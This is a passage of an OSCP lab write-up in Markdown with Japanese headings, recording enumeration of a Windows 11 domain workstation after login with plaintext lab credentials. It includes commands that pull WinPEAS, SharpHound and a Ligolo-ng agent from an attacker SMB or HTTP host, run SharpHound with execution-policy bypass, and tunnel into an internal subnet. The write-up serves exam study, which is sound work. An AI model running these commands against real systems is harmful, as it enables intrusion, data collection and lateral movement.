- Connect with RDP
```zsh
┌──(koshi㉿kali)-[~/PEN-200/AD/WS26]
└─$ xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /v:192.168.115.206 /u:'r.andrews' /p:'BusyOfficeWorker890' /d:oscp.exam
```
![[Pasted image 20260110093340.png]]

- or Connect with Evil-winrm
```zsh
evil-winrm -i 192.168.115.206 -u 'r.andrews' -p 'BusyOfficeWorker890'
```
![[Pasted image 20260110100244.png]]


---

# Local

## Auto w/ WinPEAS

### 転送・実行

- [WinPEAS - GitHub](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
```zsh
# Attacker
mkdir share
cp /usr/share/peass/winpeas/winPEASx64.exe share/
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
cd ~
net use \\192.168.49.115\share /user:username pw
cp \\192.168.49.115\share\winPEASx64.exe .
.\winPEASx64.exe | Tee-Object -FilePath \\192.168.49.115\share\peas_result.txt
```
![[Pasted image 20260110100644.png]]

### 実行結果抽出

```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Unattend Files
    C:\Windows\Panther\Unattend.xml
<Password>*SENSITIVE*DATA*DELETED*</Password>                                   </LocalAccount>                         </LocalAccounts>                        </UserAccounts><AutoLogon>                              <Username>Admin</Username>                              <Enabled>true</Enabled>                         <LogonCount>1</LogonCount>     <Password>*SENSITIVE*DATA*DELETED*</Password>

ÉÍÍÍÍÍÍÍÍÍÍ¹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
File Permissions "C:\Users\r.andrews\AppData\Local\Microsoft\WindowsApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\MicrosoftWindows.DesktopStickerEditorCentennial.exe": r.andrews [Allow: AllAccess]



```

---
---

## Manual

### ユーザー

- SeImpersonatePrivilegeが有効
```powershell
# 所属グループ
*Evil-WinRM* PS C:\> whoami /groups /fo csv | ConvertFrom-Csv | Select-Object "Group Name"

Group Name
----------
Everyone
BUILTIN\Remote Desktop Users
BUILTIN\Remote Management Users
BUILTIN\Users
NT AUTHORITY\NETWORK
NT AUTHORITY\Authenticated Users
NT AUTHORITY\This Organization
NT AUTHORITY\NTLM Authentication
Mandatory Label\High Mandatory Level

# 権限
Evil-WinRM* PS C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled
```

---

### システム情報

- Windows 11 version 23H2のよう
```powershell
PS C:\Users\r.andrews> systeminfo

Host Name:                 WS26
OS Name:                   Microsoft Windows 11 Enterprise
OS Version:                10.0.22631 N/A Build 22631
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00328-90000-00000-AAOEM
Original Install Date:     10/9/2024, 2:48:16 PM
System Boot Time:          11/13/2024, 2:43:59 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.20192059.B64.2207280708, 7/28/2022
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 3,397 MB
Virtual Memory: Max Size:  7,807 MB
Virtual Memory: Available: 5,358 MB
Virtual Memory: In Use:    2,449 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    oscp.exam
Logon Server:              \\DC20
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB5044033
                           [02]: KB5027397
                           [03]: KB5044285
                           [04]: KB5039338
                           [05]: KB5046247
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.115.206
                           [02]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.115.206
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```powershell


WindowsBuildLabEx                                       : 22621.1.amd64fre.ni_release.220506-1250
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : Enterprise
WindowsInstallationType                                 : Client
WindowsInstallDateFromRegistry                          : 10/9/2024 9:48:16 PM
WindowsProductId                                        : 00328-90000-00000-AAOEM
WindowsProductName                                      : Windows 10 Enterprise
WindowsRegisteredOrganization                           : 
WindowsRegisteredOwner                                  : Windows User
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 2009
OSDisplayVersion                                        : 23H2
BiosCharacteristics                                     : {4, 7, 9, 11...}
BiosBIOSVersion                                         : {INTEL  - 6040000, VMW71.00V.20192059.B64.2207280708, VMware, Inc. - 10000}
BiosBuildNumber                                         : 
BiosCaption                                             : VMW71.00V.20192059.B64.2207280708
BiosCodeSet                                             : 
BiosCurrentLanguage                                     : 
BiosDescription                                         : VMW71.00V.20192059.B64.2207280708
BiosEmbeddedControllerMajorVersion                      : 255
BiosEmbeddedControllerMinorVersion                      : 255
BiosFirmwareType                                        : Uefi
BiosIdentificationCode                                  : 
BiosInstallableLanguages                                : 
BiosInstallDate                                         : 
BiosLanguageEdition                                     : 
BiosListOfLanguages                                     : 
BiosManufacturer                                        : VMware, Inc.
BiosName                                                : VMW71.00V.20192059.B64.2207280708
BiosOtherTargetOS                                       : 
BiosPrimaryBIOS                                         : True
BiosReleaseDate                                         : 7/27/2022 5:00:00 PM
BiosSeralNumber                                         : VMware-42 0a 5b b2 45 4b 29 2b-3d ba 4f 20 63 67 64 3e
BiosSMBIOSBIOSVersion                                   : VMW71.00V.20192059.B64.2207280708
BiosSMBIOSMajorVersion                                  : 2
BiosSMBIOSMinorVersion                                  : 7
BiosSMBIOSPresent                                       : True
BiosSoftwareElementState                                : Running
BiosStatus                                              : OK
BiosSystemBiosMajorVersion                              : 255
BiosSystemBiosMinorVersion                              : 255
BiosTargetOperatingSystem                               : 0
BiosVersion                                             : INTEL  - 6040000
CsAdminPasswordStatus                                   : Enabled
CsAutomaticManagedPagefile                              : True
CsAutomaticResetBootOption                              : True
CsAutomaticResetCapability                              : True
CsBootOptionOnLimit                                     : DoNotReboot
CsBootOptionOnWatchDog                                  : DoNotReboot
CsBootROMSupported                                      : True
CsBootStatus                                            : {0, 0, 0, 33...}
CsBootupState                                           : Normal boot
CsCaption                                               : WS26
CsChassisBootupState                                    : Safe
CsChassisSKUNumber                                      : 
CsCurrentTimeZone                                       : -480
CsDaylightInEffect                                      : False
CsDescription                                           : AT/AT COMPATIBLE
CsDNSHostName                                           : WS26
CsDomain                                                : oscp.exam
CsDomainRole                                            : MemberWorkstation
CsEnableDaylightSavingsTime                             : True
CsFrontPanelResetStatus                                 : Unknown
CsHypervisorPresent                                     : True
CsInfraredSupported                                     : False
CsInitialLoadInfo                                       : 
CsInstallDate                                           : 
CsKeyboardPasswordStatus                                : Unknown
CsLastLoadInfo                                          : 
CsManufacturer                                          : VMware, Inc.
CsModel                                                 : VMware7,1
CsName                                                  : WS26
CsNetworkAdapters                                       : {Ethernet0, Ethernet1}
CsNetworkServerModeEnabled                              : True
CsNumberOfLogicalProcessors                             : 2
CsNumberOfProcessors                                    : 1
CsProcessors                                            : {Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz}
CsOEMStringArray                                        : {[MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7], Welcome to the Virtual Machine}
CsPartOfDomain                                          : True
CsPauseAfterReset                                       : 3932100000
CsPCSystemType                                          : Desktop
CsPCSystemTypeEx                                        : Desktop
CsPowerManagementCapabilities                           : 
CsPowerManagementSupported                              : 
CsPowerOnPasswordStatus                                 : Disabled
CsPowerState                                            : Unknown
CsPowerSupplyState                                      : Safe
CsPrimaryOwnerContact                                   : 
CsPrimaryOwnerName                                      : Windows User
CsResetCapability                                       : Other
CsResetCount                                            : -1
CsResetLimit                                            : -1
CsRoles                                                 : {LM_Workstation, LM_Server, NT}
CsStatus                                                : OK
CsSupportContactDescription                             : 
CsSystemFamily                                          : 
CsSystemSKUNumber                                       : 
CsSystemType                                            : x64-based PC
CsThermalState                                          : Safe
CsTotalPhysicalMemory                                   : 6441422848
CsPhyicallyInstalledMemory                              : 6291456
CsUserName                                              : 
CsWakeUpType                                            : PowerSwitch
CsWorkgroup                                             : 
OsName                                                  : Microsoft Windows 11 Enterprise
OsType                                                  : WINNT
OsOperatingSystemSKU                                    : EnterpriseEdition
OsVersion                                               : 10.0.22631
OsCSDVersion                                            : 
OsBuildNumber                                           : 22631
OsHotFixes                                              : {KB5044033, KB5027397, KB5044285, KB5039338...}
OsBootDevice                                            : \Device\HarddiskVolume1
OsSystemDevice                                          : \Device\HarddiskVolume3
OsSystemDirectory                                       : C:\Windows\system32
OsSystemDrive                                           : C:
OsWindowsDirectory                                      : C:\Windows
OsCountryCode                                           : 1
OsCurrentTimeZone                                       : -480
OsLocaleID                                              : 0409
OsLocale                                                : en-US
OsLocalDateTime                                         : 11/13/2024 3:33:10 AM
OsLastBootUpTime                                        : 11/13/2024 2:43:59 AM
OsUptime                                                : 00:49:10.6593929
OsBuildType                                             : Multiprocessor Free
OsCodeSet                                               : 1252
OsDataExecutionPreventionAvailable                      : True
OsDataExecutionPrevention32BitApplications              : True
OsDataExecutionPreventionDrivers                        : True
OsDataExecutionPreventionSupportPolicy                  : OptIn
OsDebug                                                 : False
OsDistributed                                           : False
OsEncryptionLevel                                       : 256
OsForegroundApplicationBoost                            : Maximum
OsTotalVisibleMemorySize                                : 6290452
OsFreePhysicalMemory                                    : 3422480
OsTotalVirtualMemorySize                                : 7994388
OsFreeVirtualMemory                                     : 5445864
OsInUseVirtualMemory                                    : 2548524
OsTotalSwapSpaceSize                                    : 
OsSizeStoredInPagingFiles                               : 1703936
OsFreeSpaceInPagingFiles                                : 1703936
OsPagingFiles                                           : {C:\pagefile.sys}
OsHardwareAbstractionLayer                              : 10.0.22621.2506
OsInstallDate                                           : 10/9/2024 2:48:16 PM
OsManufacturer                                          : Microsoft Corporation
OsMaxNumberOfProcesses                                  : 4294967295
OsMaxProcessMemorySize                                  : 137438953344
OsMuiLanguages                                          : {en-US}
OsNumberOfLicensedUsers                                 : 
OsNumberOfProcesses                                     : 143
OsNumberOfUsers                                         : 10
OsOrganization                                          : 
OsArchitecture                                          : 64-bit
OsLanguage                                              : en-US
OsProductSuites                                         : {TerminalServicesSingleSession}
OsOtherTypeDescription                                  : 
OsPAEEnabled                                            : 
OsPortableOperatingSystem                               : False
OsPrimary                                               : True
OsProductType                                           : WorkStation
OsRegisteredUser                                        : Windows User
OsSerialNumber                                          : 00328-90000-00000-AAOEM
OsServicePackMajorVersion                               : 0
OsServicePackMinorVersion                               : 0
OsStatus                                                : OK
OsSuites                                                : {TerminalServices, TerminalServicesSingleSession}
OsServerLevel                                           : 
KeyboardLayout                                          : en-US
TimeZone                                                : (UTC-08:00) Pacific Time (US & Canada)
LogonServer                                             : \\DC20
PowerPlatformRole                                       : Desktop
HyperVisorPresent                                       : True
HyperVRequirementDataExecutionPreventionAvailable       : 
HyperVRequirementSecondLevelAddressTranslation          : 
HyperVRequirementVirtualizationFirmwareEnabled          : 
HyperVRequirementVMMonitorModeExtensions                : 
DeviceGuardSmartStatus                                  : Off
DeviceGuardRequiredSecurityProperties                   : 
DeviceGuardAvailableSecurityProperties                  : 
DeviceGuardSecurityServicesConfigured                   : 
DeviceGuardSecurityServicesRunning                      : 
DeviceGuardCodeIntegrityPolicyEnforcementStatus         : 
DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus : 
```


---

### ネットワーク


---

### インストール済みアプリケーション


---

### 実行中のプロセス


---

### PowerShellログ -> nothing

```powershell
*Evil-WinRM* PS C:\Users\r.andrews\Documents> Get-History

  Id CommandLine
  -- -----------
   1 Invoke-expression


*Evil-WinRM* PS C:\Users\r.andrews\Documents> (Get-PSReadlineOption).HistorySavePath
C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt
*Evil-WinRM* PS C:\Users\r.andrews\Documents> type "C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt"
Cannot find path 'C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ServerRemoteHost_history.txt' because it does not exist.
At line:1 char:1
+ type "C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\PowerShell ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                                                                                         
    + CategoryInfo          : ObjectNotFound: (C:\Users\r.andr...ost_history.txt:String) [Get-Content], ItemNotFoundException                                                   
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand                                                                                      
*Evil-WinRM* PS C:\Users\r.andrews\Documents> type "C:\Users\r.andrews\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
powershell -ep bypass                                                                                                                                                           
net use \\192.168.49.115\share /user:username pw                                                                                                                                
net use                                                                                                                                                                         
Import-Module \\192.168.49.115\share\SharpHound.ps1                                                                                                                             
net use                                                                                                                                                                         
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\192.168.49.115\share -ZipFileName 'audit.zip'                                                                        
systeminfo
get-computerinfo
get-computerinfo | Tee-Object -FIle .\computerinfo.txt
notepad .\computerinfo.txt
net use \\192.168.49.115\share /delete
net use

```

---

### サービス

- winpeasでは
```powershell
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking if you can modify any service registry
È Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions                                                                                                                                                                        
    [-] Looks like you cannot change the registry of any service...
```

- Print Spoolerサービスは動作している
```powershell
*Evil-WinRM* PS C:\> sc.exe query Spooler
\
SERVICE_NAME: Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```
- [[#ユーザー]]の列挙から、SeImpersonatePrivilegeが有効であることはわかっているので、[[OSCP/OSCP/Lab_Writeup/OSCP/AD/WS26/PrivEsc|PrivEsc]]へ

---

### スケジュールタスク


---

### 興味深い情報

```powershell
*Evil-WinRM* PS C:\Users\r.andrews\Documents> cmdkey /list

Currently stored credentials:

* NONE *

*Evil-WinRM* PS C:\Users> ls -Recurse -File -ErrorAction SilentlyContinue


    Directory: C:\Users\r.andrews


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/13/2024   3:45 AM        6694400 agent.exe
-a----          1/9/2026   4:34 PM       10170880 winPEASx64.exe


    Directory: C:\Users\r.andrews\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/13/2024   3:21 AM           2348 Microsoft Edge.lnk


    Directory: C:\Users\r.andrews\Favorites


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/13/2024   3:21 AM            208 Bing.url


    Directory: C:\Users\r.andrews\Links


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/13/2024   3:21 AM            506 Desktop.lnk
-a----        11/13/2024   3:21 AM            935 Downloads.lnk


    Directory: C:\Users\r.andrews\Searches


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/13/2024   3:22 AM            855 winrt--{S-1-5-21-1166644149-215888741-1708426353-1105}-.searchconnector-ms


```


---
---

# AD

## Auto w/ BloodHound

### 転送・実行

- use [BloodHound Community Edition - SpectorOps](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)
```zsh
# Attacker(作成済みのSMB共有を使う)
cp /opt/bloodhound/SharpHound.ps1 share
```
```powershell
# Target(smb共有をすでに使っているとしてnet useはスキップ)
powershell -ep bypass
net use \\192.168.49.115\share /user:username pw
Import-Module \\192.168.49.115\share\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -OutputDirectory \\192.168.49.115\share -ZipFileName 'audit.zip'
```
![[Pasted image 20260110093940.png]]

- successfully imported
![[Pasted image 20260110101006.png]]

### Authentication Attack Vector -> none

- AS-REP roastable user -> none
![[Pasted image 20260110101046.png]]

- Kerberoastable User -> none
![[Pasted image 20260110101119.png]]


---

## Manual AD Enumeration

- use [PowerView](https://powersploit.readthedocs.io/en/latest/Recon/)
```powershell

```

### Domain共有の列挙




---

# Tunneling to Internal Network

- use [Ligolo-ng release - Github](https://github.com/nicocha30/ligolo-ng/releases)
- [[#システム情報]]より、amd64のAgentをダウンロード
	- https://github.com/nicocha30/ligolo-ng/releases
![[Pasted image 20260110094539.png]]

- set up proxy
```zsh
python -m http.server 8888
```
```zsh
sudo ip tuntap add user koshi mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.115.0/24 dev ligolo
ligolo-proxy -selfcert -laddr 0.0.0.0:1337
```

- set up agent
```powershell
iwr -uri http://192.168.49.115:8888/agent.exe -OutFile .\agent.exe
.\agent.exe -connect 192.168.49.115:1337 -ignore-cert
```
![[Pasted image 20260110095933.png]]

- result
![[Pasted image 20260110095957.png]]